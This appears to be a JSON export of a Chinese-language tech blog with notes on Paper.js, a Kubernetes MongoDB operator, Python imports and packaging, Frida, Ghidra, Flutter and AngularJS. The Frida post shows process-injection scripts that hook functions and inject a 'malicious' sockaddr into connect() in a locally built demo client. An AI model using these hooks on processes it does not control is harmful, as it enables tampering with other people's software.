方法，可以用来将直线转成曲线var path = new Path();path.strokeColor = &quot;black&quot;;path.add(new Point(30, 75));path.add(new Point(30, 25));path.add(new Point(80, 25));path.add(new Point(80, 75));path.closed = true; // path 默认是 open 状态，设置为 true 实现闭合path.fullySelected = true;var copy = path.clone();copy.fullySelected = true;copy.position.x += 100;copy.smooth(); // 自带的 remove 方法可以用来彻底删除对象copy.remove(); 123456789101112// 创建 path 类型的圆var circle = new Path.Circle(center_point, radius);// 创建 path 类型的矩形var path = new Path.Rectangle(point, size);// 也可以传入 Rectangle 矩形作为实例化的参数var rect = new Rectangle(new Point(50, 50), new Size(100, 100));var path = new Path.Rectangle(rect);// 创建圆角矩形var radius = new Size(20, 20);var path = new Path.Rectangle(rect, radius); 1234// 创建正多边形，例如正三角形，正十边形等// new Path.RegularPolygon(center, sides, radius)var triangle = new Path.RegularPolygon(new Point(80, 70), 3, 50);var decagon = new Path.RegularPolygon(new Point(200, 70), 10, 50) 样式12345// 创建一个打勾符号var path = new Path(&#123; segments: [[40, 115], [80, 180], [200, 20]], selected: true&#125;); 1234// 直接赋值，改成红色path.strokeColor = &quot;#ff0000&quot;;// 或者使用 color 对象赋值path.strokeColor = new Color(0.5, 0, 0.5); 12// 填充颜色path.fillColor = &quot;#ff0000&quot;; 12// 设置线段粗细path.strokeWidth = 10; 12// path 两端样式path.storkeCap = &quot;round&quot;; 12// 中间点的样式设置为圆角path.strokeJoin = &quot;round&quot;; 12// 虚线path.dashArray = [10, 12]; 12345678910111213141516171819202122232425// path 的所有相关样式都存在 style 属性中，用该字段对其他 path 进行赋值，可实现样式的复制var firstPath = new Path.Circle(&#123; center: [80, 50], radius: 35&#125;);firstPath.strokeColor = &#x27;#ff0000&#x27;;firstPath.fillColor = &#x27;blue&#x27;;// secondPath doesn&#x27;t have a strokeColor yet:var secondPath = new Path.Circle(&#123; center: [160, 50], radius: 35&#125;);// Apply the style of firstPath to that of secondPath:secondPath.style = firstPath.style;// style 也可以单独实例化，之后再赋值var newStyle = &#123; strokeColor: &quot;#ff0000&quot;, fillColor: &quot;#000000&quot;, strokeWidth: 10,&#125;path.style = newStyle; 12345// 删除某个样式，只需将该样式的属性值设置为 null 即可path.fillColor = null;// 如果要删除所有新式，则只需将整个 style 属性设置为 null 即可path.style = null 1234567891011121314151617181920// 样式可以继承project.currentStyle = &#123; strokeColor: &quot;#000000&quot;&#125;// 新建的 path 会自动继承 project 的样式var firstPath = new Path.circle(&#123; center: [100, 100], radius: 50,&#125;);// 当 project 的样式更新后，后续新创建的 path 会继承新样式project.currentStyle.strokeWidth = 8;project.currentStyle.fillColor = &#x27;green&#x27;;var secondPath = new Path.Circle(&#123; center: [250, 100], radius: 50,&#125;); 1// path.simplify() 方法可用来简化组成 path 的 segment 数量，以便减少内存占用，提高性能 123456789101112131415// path.flatten(error) 方法可用来将曲线转成多段直线var path = new Path.Circle(&#123; center: [80, 50], radius: 35&#125;);// Select the path, so we can inspect its segments:path.selected = true;// Create a copy of the path and move it by 150 points:var copy = path.clone();copy.position.x += 150;// Flatten the copied path, with a maximum error of 4 points:copy.flatten(4); 交互有三个全局的鼠标事件，可以对鼠标操作进行响应，它们分别是 onMouseDown onMouseDrag onMouse 鼠标事件的属性： point：当前鼠标位置 downPoint：鼠标被按下时所在位置 lastPoint：上一次鼠标事件的位置 middlePoint：当前位置和上次位置的中点 delta：当前位置和上次位置的矢量 vector（up 事件该值为按下和松开两个位置的矢量） 12345678910111213// 每次按下鼠标时，就给路径添加一个新的点var path = new Path();path.strokeColor = &quot;black&quot;;function onMouseDown(e) &#123; path.add(e.point);&#125;// 通过设置全局变量 tool，可控制鼠标的移动距离（最大、最小、固定距离等）tool.minDistance = 20;tool.maxDistance = 20;tool.fixedDistance = 30;","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"kubernetes mongodb operator","slug":"kubernetes mongodb operator","date":"2023-06-05T00:21:00.000Z","updated":"2024-09-21T23:16:14.422Z","comments":true,"path":"2023/06/05/kubernetes mongodb operator/","permalink":"http://example.com/2023/06/05/kubernetes%20mongodb%20operator/","excerpt":"","text":"早先在 Kubernetes 中管理 MongoDB statefulset 集群使用 sidecar 的方式，后续官方推出了 kubernetes mongodb operator，变得更加方便了，再也不需要额外的 sidecar pod 来监控数据库的状态了； 下载相关文件1git clone https://github.com/mongodb/mongodb-kubernetes-operator.git 创建资源定义创建 1kubectl apply -f config/crd/bases/mongodbcommunity.mongodb.com_mongodbcommunity.yaml 检查是否创建成功 1kubectl get crd/mongodbcommunity.mongodbcommunity.mongodb.com 创建角色资源1kubectl apply -k config/rbac/ --namespace &lt;my-namespace&gt; 检查是否创建成功 12345kubectl get role mongodb-kubernetes-operator --namespace &lt;my-namespace&gt;kubectl get rolebinding mongodb-kubernetes-operator --namespace &lt;my-namespace&gt;kubectl get serviceaccount mongodb-kubernetes-operator --namespace &lt;my-namespace&gt; 创建 operator1kubectl create -f config/manager/manager.yaml --namespace &lt;my-namespace&gt; 检查是否创建成功 1kubectl get pods --namespace &lt;my-namespace&gt;","categories":[{"name":"运维","slug":"运维","permalink":"http://example.com/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"kubernetes","slug":"kubernetes","permalink":"http://example.com/tags/kubernetes/"}]},{"title":"Python import 用法","slug":"Python import 用法","date":"2022-03-13T07:05:00.000Z","updated":"2024-09-21T23:18:26.811Z","comments":true,"path":"2022/03/13/Python import 用法/","permalink":"http://example.com/2022/03/13/Python%20import%20%E7%94%A8%E6%B3%95/","excerpt":"","text":"常规导入模块 Modules一个 py 文件即相当于一个模块 Module；它可以被其他 py 导入，以便复用其中的代码； 12import mathmath.pi() 被导入的 py 文件，同时充当了一个命名空间（Namespace），可通过该命名空间访问其内部的变量和函数； 当使用 from A import B 时，就把 B 导入到全局命名空间中了，这个时候并没有导入 A；而且导入时 B 还可以重命名 B，例如： 1from math import pi as PI 包 PackagesPacage 也是一个模块，它跟普通模块的区别在于它内部包含了其他模块或者其他 Package Python 官方文档对 Package 的解释为，当一个模块的内置 path 属性有值时，即是一个 Package；个人感觉包和模块很像目录和文件的关系； 实际使用中，Package 通常是一个包含 py 文件和子目录的文件夹；当给某个文件夹中添加一个 init 文件时，它就变成了一个 pakcage；init 文件中可以放置内容，它表示当 package 被作为模块导入时，该模块包含的内容；它可以为空； 当一个文件夹没有 init 文件时，它仍然会被 Python 解释器视作一个 Package，只是它不是普通的 Package，而是一个特殊的 package，称为命名空间 Package； 通常在导入一个包时，并不导入它里面的子模块和子包。 发现一个有意思的点，当使用 from A import B 时，虽然 A 没有导入进来，但是 B 和 A 的上下级关系是存在的。因此如果有另外一行代表导入了 A，那么即使 A 的 init 文件中没有导入 B，也仍然可以通过 A.B 来访问 B； 使用 import A.B.C 来导入时，A.B. 表示的是路径关系好像；而且一旦导入成功，B 和 C 的上下级关系就建立了；即使 B 的 init 文件中原本默认没有导入 C，也因为这种关系的建立，使得 B.C 的访问能够成功； 当一个包中的 init 文件为空时，那么导入这个包时，只导入了一个命名空间，并未导入任何具体的模块； 注意：当导入一个模块时，除了会导入模块中的内容外，还会同时创建一个包含该内容的命名空间；当使用不同的导入方法时，同一个模块可以隶属于不同的命名空间；即可以通过多个命名空间访问到相同的模块； 模块本质上面是一个对象，因此可以通过对象的内置方法来访问来模块中的内容，示例如下： 12import mathmath.__dict__[&#x27;pi&#x27;] 在 init 文件中导入包中的模块，可以让包的使用者更方便的使用这些模块，而无须记住相应的路径 绝对导入和相对导入如果代码只在本地使用，不需要共享给他人使用时，使用绝对路径导入是一个不错的方法。但是如果它成为一个包，需要被其他人复用时，那么使用绝对路径就会报错了，此时需要在包中使用相对路径。同时引用该包的人，可通过 pip 安装该包。安装后，包就会被存放在默认的 site_packages 文件夹中，这样在运行脚本时就可以被解释器找到；不然就得修改 PYTHONPATH 环境变量或者调用 sys.path 方法添加包的路径； 当解释器遇到 import 语句时，它会到三个地方寻找包，分别如下： 当前脚本所在的目录； 环境变量 PYTHONPATH 指向的目录； pip 存放依赖的目录； 安装本地包添加配置文件 setup.py，在里面 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#!/usr/bin/env python# -*- coding: utf-8 -*-import ioimport osimport sysfrom shutil import rmtreefrom setuptools import find_packages, setup, Command# Package meta-data.NAME = &#x27;mypackage&#x27;DESCRIPTION = &#x27;My short description for my project.&#x27;URL = &#x27;https://github.com/me/myproject&#x27;EMAIL = &#x27;me@example.com&#x27;AUTHOR = &#x27;Awesome Soul&#x27;REQUIRES_PYTHON = &#x27;&gt;=3.6.0&#x27;VERSION = &#x27;0.1.0&#x27;# What packages are required for this module to be executed?REQUIRED = [ # &#x27;requests&#x27;, &#x27;maya&#x27;, &#x27;records&#x27;,]# What packages are optional?EXTRAS = &#123; # &#x27;fancy feature&#x27;: [&#x27;django&#x27;],&#125;# The rest you shouldn&#x27;t have to touch too much :)# ------------------------------------------------# Except, perhaps the License and Trove Classifiers!# If you do change the License, remember to change the Trove Classifier for that!here = os.path.abspath(os.path.dirname(__file__))# Import the README and use it as the long-description.# Note: this will only work if &#x27;README.md&#x27; is present in your MANIFEST.in file!try: with io.open(os.path.join(here, &#x27;README.md&#x27;), encoding=&#x27;utf-8&#x27;) as f: long_description = &#x27;\\n&#x27; + f.read()except FileNotFoundError: long_description = DESCRIPTION# Load the package&#x27;s __version__.py module as a dictionary.about = &#123;&#125;if not VERSION: project_slug = NAME.lower().replace(&quot;-&quot;, &quot;_&quot;).replace(&quot; &quot;, &quot;_&quot;) with open(os.path.join(here, project_slug, &#x27;__version__.py&#x27;)) as f: exec(f.read(), about)else: about[&#x27;__version__&#x27;] = VERSION# Where the magic happens:setup( name=NAME, version=about[&#x27;__version__&#x27;], description=DESCRIPTION, long_description=long_description, long_description_content_type=&#x27;text/markdown&#x27;, author=AUTHOR, author_email=EMAIL, python_requires=REQUIRES_PYTHON, url=URL, packages=find_packages(exclude=[&quot;tests&quot;, &quot;*.tests&quot;, &quot;*.tests.*&quot;, &quot;tests.*&quot;]), # If your package is a single module, use this instead of &#x27;packages&#x27;: # py_modules=[&#x27;mypackage&#x27;], # entry_points=&#123; # &#x27;console_scripts&#x27;: [&#x27;mycli=mymodule:cli&#x27;], # &#125;, install_requires=REQUIRED, extras_require=EXTRAS, include_package_data=True, license=&#x27;MIT&#x27;, classifiers=[ # Trove classifiers # Full list: https://pypi.python.org/pypi?%3Aaction=list_classifiers &#x27;License :: OSI Approved :: MIT License&#x27;, &#x27;Programming Language :: Python&#x27;, &#x27;Programming Language :: Python :: 3&#x27;, &#x27;Programming Language :: Python :: 3.6&#x27;, &#x27;Programming Language :: Python :: Implementation :: CPython&#x27;, &#x27;Programming Language :: Python :: Implementation :: PyPy&#x27; ], # $ setup.py publish support. cmdclass=&#123; &#x27;upload&#x27;: UploadCommand, &#125;,) 安装命令 1python -m pip install -e . Resources 导入在 3.7 版本之后，静态资源文件也支持像包一样处理，只需要在资源所有的文件中添加一个 init 文件即可；然后引入包后，只需要使用内置的 importlib.resources 模块，即可实现对资源文件的读取 假设包中有如下资源： 12345books/│├── __init__.py├── alice_in_wonderland.png└── alice_in_wonderland.txt 则可以通过如下方式读取其中的资源文件： 1234from importlib import resourceswith resources.open_text(&quot;books&quot;, &quot;alice.txt&quot;) as fid: alice = fid.readlines() 示例二： 1234data/│├── __init__.py└── WPP2019_TotalPopulationBySex.csv 1234from importlib import resourceswith resources.open_text(&quot;data&quot;, &quot;WPP2019_TotalPopulationBySex.csv&quot;) as fid: rows = csv.DictReader(fid)","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"Python Package 配置","slug":"python package 配置","date":"2022-03-13T06:43:00.000Z","updated":"2024-09-21T23:18:31.955Z","comments":true,"path":"2022/03/13/python package 配置/","permalink":"http://example.com/2022/03/13/python%20package%20%E9%85%8D%E7%BD%AE/","excerpt":"","text":"步骤 命名给 pip 使用的名字可以长一点和详细一点，这样更容易一眼看懂这个包是干嘛的，例如 realpython-reader；而用于导入时的包名称可以短一点，例如 import reader；这两点可以在 setup 文件中配置实现； 1pip install realpython-reader 12&gt;&gt;&gt; import reader&gt;&gt;&gt; help(reader) 配置有三种配置方法，分别是： setup.py：最传统的一种 setup.cfg：用静态文件来替代 setup 脚本 pyproject.toml：用新格式静态文件，这是最新的标准，但是这种方式的缺点是不支持可编辑模块，此时需要额外写一个简单的 setup.py 来实现可编辑模块的安装；","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"Frida","slug":"Frida","date":"2022-01-07T00:48:00.000Z","updated":"2024-09-21T23:14:28.786Z","comments":true,"path":"2022/01/07/Frida/","permalink":"http://example.com/2022/01/07/Frida/","excerpt":"","text":"基本概念Frida 是一个用来向目标进程动态注入指令的工具，它使用 python 编写，因此可在多种操作系统中使用，例如 Windows, MacOS, Linux, Android, iOS 等等； 当要在 Android 上面使用时，需要先使用 root 权限运行 frida-server 进程，然后将手机通过 USB 线连接到电脑上，开启调试模式，之后就可以通过在 PC 端运行脚本实现预期效果（原理：PC 端脚本会发送指令给 frida-server 执行）； 代码示例函数注入先用 c 语言快速定义一个程序 1234567891011121314151617181920// hello.c#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;// 函数 func 接受一个参数，并打印出该参数值void func (int n) &#123; printf (&quot;Number: %d\\n&quot;, n);&#125;int main (int argc, char * argv[]) &#123; int i = 0; // 函数在编译成可执行文件后，都会有一个虚拟内存地址，此处将该地址打印出来，以方便进行 hook printf (&quot;func() is at %p\\n&quot;, func); while (1) &#123; func (i++); sleep (1); &#125;&#125; 然后调用编译踌躇，编译成可运行的程序，用来测试： gcc -Wall hello.c -o hello 读取函数参数12345678910111213141516171819202122# hook.pyfrom __future__ import print_functionimport fridaimport syssession = frida.attach(&quot;hello&quot;) # 绑定名称为 hello 的进程# 通过 ptr 指针值绑定内存中指定的位置script = session.create_script(&quot;&quot;&quot; Interceptor.attach(ptr(&quot;%s&quot;), &#123; onEnter: function(args) &#123; send(args[0].toInt32()); &#125; &#125;);&quot;&quot;&quot; % int(sys.argv[1], 16))def on_message(message, data): print(message)script.on(&#x27;message&#x27;, on_message)script.load()sys.stdin.read() 修改函数参数123456789101112131415161718# modify.pyimport fridaimport syssession = frida.attach(&quot;hello&quot;)# 此处脚本通过绑定指定内存地址中的函数，当进入该函数时，就将参数列表中的第一个参数的值修改为 1337script = session.create_script(&quot;&quot;&quot;Interceptor.attach(ptr(&quot;%s&quot;), &#123; onEnter: function(args) &#123; args[0] = ptr(&quot;1337&quot;); &#125;&#125;);&quot;&quot;&quot; % int(sys.argv[1], 16))script.load()sys.stdin.read() 替换函数12345678910111213141516# call.pyimport fridaimport syssession = frida.attach(&quot;hello&quot;)# 调用 NativeFunction 在指定位置自定义了一个新函数，当该位置的函数被调用时，就会触发自定义的函数# NativeFunction 函数的第二个参数用来指定返回值的类型，此处为 void，表示没有返回值script = session.create_script(&quot;&quot;&quot; var func = new NativeFunction(ptr(&quot;%s&quot;), &#x27;void&#x27;, [&#x27;int&#x27;]); func(1911); func(1911); func(1911);&quot;&quot;&quot; % int(sys.argv[1], 16))script.load() 注入字符串123456789101112131415161718192021// hi.c 定义一个接受字符串参数的函数，并编译成可执行程序#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int func(const char *s) &#123; printf(&quot;String: %s\\n&quot;, s); return 0;&#125;int main(int argc, char* argv[]) &#123; const char* s = &quot;Testing!&quot;; printf(&quot;f() is at %p\\n&quot;, func); printf(&quot;s is at %p\\n&quot;, s); while(1) &#123; func(s); sleep(1); &#125;&#125; 123456789101112131415161718192021222324from __future__ import print_functionimport fridaimport syssession = frida.attach(&quot;hi&quot;)# NativeFunction 函数的第二个参数用来指定返回值的类型，此处为 int# 第三个参数是一个列表，用来存放输入类型# 注意：在注入字符串时，传递给自定义函数的值是字符串的指针# 注意：此处使用了 Memory.allocUtf8String 来创建自定义字符串，事实上，还有很多相关的方法可用# 例如：Memory.alloc(), Memory.protect() 等script = session.create_script(&quot;&quot;&quot; var st = Memory.allocUtf8String(&#x27;TESTMEPLZ!&#x27;); var func = new NativeFunction(ptr(&quot;%s&quot;), &#x27;int&#x27;, [&#x27;pointer&#x27;]); func(st);&quot;&quot;&quot; % int(sys.argv[1], 16))def on_message(message, data): print(message)script.on(&#x27;message&#x27;, on_message)script.load() 注入对象12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182// client.c#include &lt;arpa/inet.h&gt;#include &lt;errno.h&gt;#include &lt;netdb.h&gt;#include &lt;netinet/in.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int main(int argc, char* argv[]) &#123; int sock_fd, i, n; struct sockaddr_in serv_addr; unsigned char* b; const char* message; char recv_buf[1024]; if (argc != 2) &#123; fprintf(stderr, &quot;Usage: %s&lt;ip of server&gt;\\n&quot;, argv[0]); return 1; &#125; printf(&quot;connect() is at: %p\\n&quot;, connect); if ((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0) &#123; perror(&quot;Unable to create socket&quot;); return 1; &#125; bzero(&amp;serv_addr, sizeof(serv_addr)); serv_addr.sin_family = AF_INET; serv_addr.sin_port = htons(5000); if (inet_pton(AF_INET, argv[1], &amp;serv_addr.sin_addr) &lt;= 0) &#123; fprintf(stderr, &quot;Unable to parse IP address\\n&quot;); return 1; &#125; printf(&quot;\\nHere&#x27;s the serv_addr buffer:\\n&quot;); b = (unsigned char *) &amp;serv_addr; for (i = 0; i != sizeof(serv_addr); i++) &#123; printf(&quot;%s%02x&quot;, (i != 0) ? &quot; &quot; : &quot;&quot;, b[i]); &#125; printf(&quot;\\n\\nPress ENTER key to Continue\\n&quot;); while(getchar() == EOF &amp;&amp; ferror(stdin) &amp;&amp; errno == EINTR) &#123; ; &#125; if (connect(sock_fd, (struct sockaddr*) &amp;serv_addr, sizeof(serv_addr)) &lt; 0) &#123; perror(&quot;Unable to connnect&quot;); return 1; &#125; message = &quot;Hello there!&quot;; if (send(sock_fd, message, strlen(message), 0) &lt; 0) &#123; perror(&quot;Unable to send&quot;); return 1; &#125; while(1) &#123; n = recv(sock_fd, recv_buf, sizeof(recv_buf) - 1, 0); if (n == -1 &amp;&amp; errno == EINTR) &#123; continue; &#125; else if (n &lt;= 0) &#123; break; &#125; recv_buf[n] = 0; fputs(recv_buf, stdout); &#125; if (n &lt; 0) &#123; perror(&quot;Unable to read&quot;); &#125; return 0;&#125; 12345678910111213141516171819202122232425262728293031323334from __future__ import print_functionimport fridaimport syssession = frida.attach(&quot;client&quot;)script = session.create_script(&quot;&quot;&quot; send(&#x27;Allocating memory and writing bytes...&#x27;); var st = Memory.alloc(16); st.writeByteArray([0x02, 0x00, 0x13, 0x89, 0x7F, 0x00, 0x00, 0x01, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30]); Interceptor.attach(Module.getExportByName(null, &#x27;connect&#x27;), &#123; onEnter: function(args) &#123; send(&#x27;Injecting malicious byte array:&#x27;); args[1] = st; &#125;, // onLeave: function(retval) &#123; // retval.replace(0); // &#125; &#125;);&quot;&quot;&quot;)def on_message(message, data): if message[&#x27;type&#x27;] == &#x27;error&#x27;: print(&quot;[!]&quot; + message[&#x27;stack&#x27;]) elif message[&#x27;type&#x27;] == &#x27;send&#x27;: print(&quot;[i]&quot; + message[&#x27;payload&#x27;]) else: print(message)script.on(&#x27;message&#x27;, on_message)script.load()sys.stdin.read() 注入指令 可以直接使用 js 编写注入函数 步骤 运行 frida-server，以便 PC 端的指令可发送到手机端；方法：adb shell 连通手机 shell，运行 frida-server 可执行文件，按官网教程，路径为 &#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server 运行 frida-ls-devices，列出当前连接的设备，得到 ID 号； 运行 frida-ps -Ua，列出当前运行的进程，得到进程名称； 运行 frida -D -f -l --no-pause 示例","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Ghidra","slug":"Ghidra","date":"2022-01-04T01:04:00.000Z","updated":"2024-09-21T23:14:44.400Z","comments":true,"path":"2022/01/04/Ghidra/","permalink":"http://example.com/2022/01/04/Ghidra/","excerpt":"","text":"基本概念Ghidra 是一个逆向工具，它除了内置功能外，还支持通过插件实现功能扩展； Ghidra 基于项目 project 来管理要所逆向工程的内容，因此第一步需要先创建一个项目，或者导入一个项目； 新创建的项目并没有什么数据，第二步需要导入相关文件，才有办法实现后续的操作；导入文件时，会生成 program； Ghidra tool：插件管理器，当运行某个插件时，会新开一个窗口，可在 “Running Tools” 栏目查看当前正在运行的插件列表； Ghidra 本体并不负责实际的功能，各功能由插件来完成，当运行某个插件时，会新打开一个插件窗口，该窗口中有该插件的各相关功能； 使用方法创建项目 新建项目：File -&gt; New project -&gt; Non-shared Project -&gt; 选择项目存放目录 如果之前已经创建过项目，则可以使用 Open Project 导入之前的项目文件； 运行插件 启动插件：Tool Chest 栏，点击 code browser 图标 使用插件 导入文件：File -&gt; Import file，导入后会开始解析文件，需要较长的时间（原因：对代码进行反汇编），耐心等待解析完成； 搜索位置 按名称搜索：Search -&gt; For Strings 按行号搜索：Search -&gt; For Scalars","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/tags/%E9%80%86%E5%90%91/"}]},{"title":"Flutter","slug":"Flutter","date":"2022-01-01T07:07:00.000Z","updated":"2024-09-21T23:14:24.393Z","comments":true,"path":"2022/01/01/Flutter/","permalink":"http://example.com/2022/01/01/Flutter/","excerpt":"","text":"基本概念Vue 中的组件在这里叫做 Widget，组件可以包含组件，组件可以通过继承实现快速构建；组件通过内置的 build 方法来实现渲染，有点像小程序中的 setData；组件也有一些内置的属性，用来设置组件的相关信息，例如标题，主体等； 官方的 Material 组件库里面有很多前人写好的组件，可以用来快速构建应用；这些组件自带样式，可以自适应不同的终端，非常方便；有些组件甚至可以只负责样式，然后再内置包含内容的其他组件，很灵活，实现了样式和内容的解耦； 有个 pubspec.yaml 文件很像 nodejs 里面的 package.json 文件，用来定义项目的相关信息以及依赖的库；同时还有一个 pub.dev 仓库网站，类似 nodejs 里面的 npm 仓库，可以方便的实现第三方库的集中管理和下载；另外还有一个 pubspec.lock 文件，貌似也跟 nodejs 里面的 package_json.lock 功能差不多； flutter pub 命令很像 npm ，用来管理包，例如 flutter pub get 类似 npm install，用来安装依赖文件中指定的各种包，flutter pub add 则用来添加包（发现添加后，好像并没有自动下载，而是需要再运行一下 pub get 才行，但是看 pub.dev 网站的文档好像只需要 add 就可以了）； StateLessWidget 表示无状态的应用，即生成后里面的数据就不可变了；如果里面的数据需要可变的，则需要使用 StatefulWidget；但是很有意思的是 StatefulWidget 的实现是在它里面再包含一个 State 类来实现的可变状态（猜测这样是为了兼容性？）； 通过在类名添加下划线前缀，在 Dart 中表示强制私有；在创建 StatefulWidget 时，编辑器自动创建的 State 类即默认为私有的； 创建 State 时，有一个很有意思的点，即新创建的 state 并不是直接继承某个 StateWidget 来实现的，而是给 State 传递一个 StatefulWidegt 来实现，示例如下： 12class _RandomWordsState extends State&lt;RandomWords&gt; &#123;&#125;// 此处的 RandomWords 是一个 StatefulWidget Widget 类有一个内置的 build 方法，用来初始化对象，一般继承父类后，会通过重写 build 方法覆盖父类的方法； StatefulWidget 类有一个内置的 createState 方法，用来初始化 State 对象，通过对其进行重写，实现自定义的 State； 在类内部定义的函数，直接就是该类的方法，如果加上下划线作为前缀，则成为该类的私有方法； ListView 有一个内置的 itemBuilder 方法，貌似列表滚动到底后，会自动触发该方法； 布局在 Flutter 里面，一切均是 Widget，它既负责展示，也负责交互，很像 Vue 里面的组件； 通常来说，内置的组件已经设定好了默认样式；如果想修改这些默认样式，例如 margin, padding, border, backgroud 等，有两种方法： 通过外加一层 Container 的 Widget 来实现，自定义的样式放在 Container 当中去实现，同时将内置 Widget 放在 Container 中，而不是去修改内置 Widget，这样实现了更好的解耦，也方便将来进行统一的管理，例如当更新某些全局设置时，所有内置 Widget 都会相应更新，而不会因为自行修改导致失效； 直接修改 Widget 的相关属性来实现，例如 color, font, weight 等； 有一些 widget 是专门负责布局排版的，统称为 layout widget，主要有以下三类： single-child：只包含一个子元素； multi-child：包含多个子元素； silver：其他一些类型； 所有的 layout widget 不外乎使用以下两种方式中的一种来添加子元素 child ：仅有单个子元素，例如 Center，Container 等； children ：拥有多个子元素，例如 Row，Column，ListView 或 Stack 等； 大部分 Widget 都有一个 build 方法，当该方法被调用时，将生成界面； 常用 WidgetScaffold：包含顶部标题栏，标题，背景色等元素； Row：表示一行，里面可以嵌套各种东西； Column：表示一列，里面可以嵌套各种东西； Row 或 Column 内部元素的对齐，通过其属性 mainAxisAllignment 和 crossAxisAlignment 来实现； 12345678Row( mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: [ Image.asset(&#x27;images/pic1.jpg&#x27;), Image.asset(&#x27;images/pic2.jpg&#x27;), Image.asset(&#x27;images/pic3.jpg&#x27;), ],); 如果图片的大小跟所设定的区域尺寸不匹配，可通过将其放到 Expanded 中，来实现自动缩放，示例如下： 1234567891011121314Row( crossAxisAlignment: CrossAxisAlignment.center, children: [ Expanded( child: Image.asset(&#x27;images/pic1.jpg&#x27;), ), Expanded( child: Image.asset(&#x27;images/pic2.jpg&#x27;), ), Expanded( child: Image.asset(&#x27;images/pic3.jpg&#x27;), ), ],); 123456789101112131415Row( crossAxisAlignment: CrossAxisAlignment.center, children: [ Expanded( child: Image.asset(&#x27;images/pic1.jpg&#x27;), ), Expanded( flex: 2, child: Image.asset(&#x27;images/pic2.jpg&#x27;), ), Expanded( child: Image.asset(&#x27;images/pic3.jpg&#x27;), ), ],); 默认情况下，Row 或 Column 内部的元素会占据整行或整列的空间，如果需要各个元素按指定尺寸挨着显示，则可以通过设置 mainAxisSize 来实现 12345678910Row( mainAxisSize: MainAxisSize.min, // 设置尺寸 children: [ Icon(Icons.star, color: Colors.green[500]), Icon(Icons.star, color: Colors.green[500]), Icon(Icons.star, color: Colors.green[500]), const Icon(Icons.star, color: Colors.black), const Icon(Icons.star, color: Colors.black), ],)","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Dart","slug":"Dart","permalink":"http://example.com/tags/Dart/"},{"name":"前端","slug":"前端","permalink":"http://example.com/tags/%E5%89%8D%E7%AB%AF/"}]},{"title":"Angularjs","slug":"Angularjs","date":"2021-11-17T23:55:00.000Z","updated":"2024-09-21T23:13:21.407Z","comments":true,"path":"2021/11/18/Angularjs/","permalink":"http://example.com/2021/11/18/Angularjs/","excerpt":"","text":"组件组件由三部分组成： class：数据、功能（函数）； template：HTML 模板 style：样式 在 HTML 标签中，点击事件绑定用以下方法来表示： 1&lt;button (click)=&quot;doSomething&quot;&gt;do something&lt;button&gt; HTML 模板中所需要的数据，通过使用依赖注入的方法，实现动态更新的效果，示例如下： 单向绑定 1&lt;h2&gt;&#123;&#123;hero.name | uppercase&#125;&#125; Details&lt;/h2&gt; 此处的“| uppercase” 是一个管道连接符 + 一个内置格式转换函数，它可以将字符串转成大写。在 angular 中，这种方式被称为 pipe 函数，包括 DatePipe, UppercasePipe, LowercasePipe, CurrencyPipe, DecimalPipe, PercentPipe 等； 双向绑定 1&lt;input id=&quot;hero-name&quot; [(ngModel)]=&quot;hero.name&quot; placeholder=&quot;name&quot;&gt; 此处通过 [(ngModel)] 实现双向绑定，这样就不需要在 JS 中监听 input 事件，并手工更新 JS 中的数据，确实方便很多； 服务组件的数据可以依赖服务来注入，实现数据和组件之间的解耦。这样当数据的实现发生变化时，不需要变更组件，只需要更新服务内部的代码即可；数据来源可以是本地存储、硬编码、网络接口等； 通过将服务注入组件内部的 constructor 构建函数，之后在组件的 onInit hook 中调用初始化函数，来实现内部对数据的自定义处理 此处非常有意思，首先外部引入的 HeroService 本身就是一个类（或函数），已经实现了第一层的解耦，但之后在组件中引入该服务时，只是将其添加为组件 Class 的私有属性，同时组件又定义了自己的 Service 函数，在该 Service 函数中调用 HeroSerivice，这样一样就实现了双重解耦，如果 HeroService 的实现有任何变化，都只需要更新组件自己定义的 Service 函数，而不会影响到组件内部的其他位置的代码； 理论上任何读取外部数据的场景，都最好自定义一个函数，来实现解耦，避免内部代码跟外部数据的实现之间产生耦合； 创建服务的命令：ng generate service @Injectable 修饰符用来定义服务的元属性，例如定义可注入的范围等（root 表示全局可注入），有点类似 @component 用来定义组件的元属性一样； 当服务的数据来源是网络接口时，数据的获得是异步的，因此服务需要支持该异步场景，对异步状态下的数据进行处理； 为了支持异常，ng 引入了一个 Observable 类，这个类有点像是 Promise，它会返回一个对象，该对象有一个 Subscribe 方法；该方法接受一个回调函数，并将最终数据做为参数，传递给回调函数； constructor 构建函数的初始化很有意思，它有一个快捷方式，即在参数定义中，可以直接将参数赋值给相应名称的属性，这个做法跟 c++ 不太一样，示例如下： constructor*(private messageService: MessageService) { } 